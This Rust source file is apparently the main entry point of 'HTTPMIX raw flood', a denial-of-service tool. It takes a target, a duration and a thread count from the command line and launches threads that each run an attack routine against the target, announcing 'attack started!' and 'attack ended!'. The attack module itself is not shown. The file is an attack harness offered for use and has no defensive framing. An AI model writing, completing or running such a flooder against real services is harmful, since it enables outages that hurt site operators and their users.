/*
    HTTPMIX raw flood

    Released by ATLAS API corporation

    Made by Benshii Varga
*/

#![allow(unused_variables)]
#![allow(unused_imports)]

use std::sync::{Arc, Mutex};

use rand::seq::SliceRandom;

use std::fs::File;
use std::io::{BufRead, BufReader};

mod utils;
mod attack;

use utils::random_useragent;
use attack::*;


fn main() -> Result<(), Box<dyn std::error::Error>> {

    std::env::set_var("MINREQ_TIMEOUT", "5");

    let args: Vec<String> = std::env::args().collect();
    if args.len() != 4 {
        println!("Usage: ./httpmix <target> <time> <threads>");
        std::process::exit(1);
    }
    let target = args[1].to_owned();
    let time: u64 = match args[2].parse() {
        Ok(time) => time,
        Err(_) => {
            println!("error: time is not a valid integer!");
            std::process::exit(1);
        },
    };

    let threads: u64 = match args[3].parse() {
        Ok(value) => value,
        Err(_) => {
            println!("error: threads is not a valid integer!");
            return Ok(());
        },
    };

    if threads <= 0 {
        println!("error: threads must be greater than 0");
        std::process::exit(1);
    }

    let start_time = std::time::Instant::now();

    std::thread::spawn(move || {
        loop {
            if std::time::Instant::now().duration_since(start_time) >= std::time::Duration::from_secs(time) {
                println!("attack ended!");
                std::process::exit(0);
            }
        }
    });

    println!("attack started!");

    let new_target = Arc::new(Mutex::new(String::from(target.to_string().clone())));

    let mut tasks = vec![];
    for i in 0..threads {
        let target = Arc::clone(&new_target);

        let task = std::thread::spawn(move||{
            let target = target.lock().unwrap().clone();
            let res = attack::attack(&target, i);
            //dbg!(res);
        });
        tasks.push(task);
    }

    for task in tasks.into_iter() {
        task.join().unwrap();
    }
    
    Ok(())
}
